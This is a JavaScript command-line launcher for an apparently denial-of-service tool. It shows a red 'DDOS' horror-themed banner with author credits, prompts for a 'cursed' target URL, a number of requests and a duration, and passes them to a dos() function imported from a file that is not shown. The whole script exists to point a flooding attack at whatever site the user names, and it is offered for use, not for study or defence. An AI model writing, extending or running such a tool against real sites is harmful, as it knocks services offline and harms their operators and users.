const dos = require('./bin');
const readline = require('readline');

// Original ASCII Art with Horror Theme
const asciiArt = `
▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                        
`;

console.log('\x1b[31m%s\x1b[0m', asciiArt); // Red color for horror effect
console.log('\x1b[31m%s\x1b[0m', 'Version 1.0');
console.log('\x1b[31m%s\x1b[0m', 'Credits: Berwin');
console.log('\x1b[31m%s\x1b[0m', 'Facebook: https://fb.com/learnfromber');
console.log('\x1b[31m%s\x1b[0m', 'Enter at your own risk...');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function askQuestion(query) {
  return new Promise(resolve => rl.question(query, resolve));
}

async function main() {
  try {
    let url;
    while (true) {
      url = await askQuestion('\x1b[31mENTER THE CURSED URL HERE!: \x1b[0m').then(input => input.trim());
      if (url && (url.startsWith('http://') || url.startsWith('https://'))) {
        break;
      } else {
        console.log('\x1b[31mPlease enter a valid URL starting with "http://" or "https://", or face the consequences...\x1b[0m');
      }
    }

    const requestType = await askQuestion('\x1b[31mHOW MANY OF REQUEST DO YOU DARE TO MAKE?: \x1b[0m').then(input => input.trim());
    const requestTime = await askQuestion('\x1b[31mHOW LONG SHALL THE REQUEST LAST?: \x1b[0m').then(input => parseInt(input.trim(), 10));

    dos(url, requestType, requestTime);
  } catch (err) {
    console.error('\x1b[31mA dark error has occurred:\x1b[0m', err);
  } finally {
    rl.close();
  }
}

main();
